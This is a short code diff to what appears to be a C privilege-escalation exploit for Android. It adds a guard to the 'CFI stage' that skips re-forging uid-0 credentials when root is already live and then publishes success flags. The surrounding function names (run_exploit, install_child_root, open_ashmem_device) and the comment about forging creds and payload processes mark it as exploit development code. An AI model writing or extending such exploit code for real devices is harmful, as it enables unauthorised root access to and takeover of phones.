@@ -634,6 +634,22 @@ int install_child_root(int fd) {
 }
 int try_cfi_stage(void) {
   cfi_attempts++;
+  /* Repeat-entry idempotence. run_exploit can reach this stage more than
+   * once per process (sequential slide routes) and the supervisor may
+   * start a new payload process on the same boot. A later pass must not
+   * redo the forge: the mp stage unlinks the creds file and a fresh
+   * cascade orphans the live daemon's evidence. Fresh-valid uid-0 creds
+   * plus an answering daemon mean root is already live this boot. */
+  if (root_already_live()) {
+    root_uid_before = (uint32_t)getuid();
+    root_child_done = 1;
+    root_uid_after = 0;
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+    atomic_store(&cfi_stage_done, 1);
+    rmg_diag("CFI stage skipped, root already live; globals published\n");
+    return 1;
+  }
   int fd = open_ashmem_device();
   int dirty = 0;
   int can_read_back = 0;
